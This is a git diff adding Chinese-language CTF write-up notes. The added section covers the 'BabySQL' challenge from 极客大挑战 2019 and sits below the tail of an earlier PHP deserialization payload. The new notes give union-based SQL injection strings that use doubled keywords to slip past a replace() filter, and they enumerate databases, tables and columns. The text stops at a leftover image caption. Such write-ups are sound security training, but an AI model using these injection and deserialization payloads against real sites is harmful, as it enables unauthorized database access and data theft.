@@ -324,3 +324,26 @@ O:4:"Name":3:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
 
 payload: `?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
 
+
+### [极客大挑战 2019]BabySQL
+
+1.获取字段长
+
+1' or 1=1 # 显示ERROER
+但是仔细观察报错语句，似乎没有看到or
+
+猜测后端使用replace()函数过滤，尝试双写or：1' oorr 1=1 #正常回显，看来我们猜测的不错。
+
+判断字段为3： 1' oorrder bbyy 3 #，回显正常，试下4：1' oorrder bbyy 4 #          error
+
+
+2，数据库
+1' uniunionon selselectect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) #
+ctf库。。。
+
+然后表名：1' uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek' #
+得到表名：b4bsql,geekuser
+
+查下b4bsql里面的列1' uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name="b4bsql" #
+列名：id,username,password
+在这里插入图片描述
